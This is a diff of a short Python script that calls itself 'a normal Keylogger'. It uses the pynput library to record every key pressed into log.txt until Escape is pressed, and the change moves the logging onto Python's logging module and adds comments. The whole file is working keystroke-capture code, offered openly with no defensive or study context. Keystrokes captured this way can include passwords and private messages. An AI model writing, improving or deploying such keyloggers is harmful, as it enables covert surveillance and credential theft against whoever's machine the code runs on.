@@ -1,23 +1,23 @@
 #This is a normal Keylogger with the Python
 from pynput.keyboard import Listener, Key
+import logging
 
-keys=[]
+# Set up logging configuration
+logging.basicConfig(filename=('log.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-def write_to_file(keys):
-    with open("log.txt","a") as f:
-        for i in keys:
-            a = str(i).replace("'",'')
-            f.write(a)
-            f.write(',')
-
+# Function to be called when a key is pressed
 def on_press(key):
-    keys.append(key)
-    write_to_file(keys)
+    # Create a log message indicating which key was pressed
+    k = '{0} was pressed at '.format(key)
+    logging.info(str(key))
 
+# Function to be called when a key is released
 def on_release(key):
+    # Check if the pressed key is the Escape key (key.esc), then listener have to stop
     if key == key.esc:
         return False
 
-# Start the listener for key presses
-with Listener(on_press=on_press,on_release=on_release) as l:
+# Start the listener for key presses and releases
+with Listener(on_press=on_press, on_release=on_release) as l:
     l.join()
+
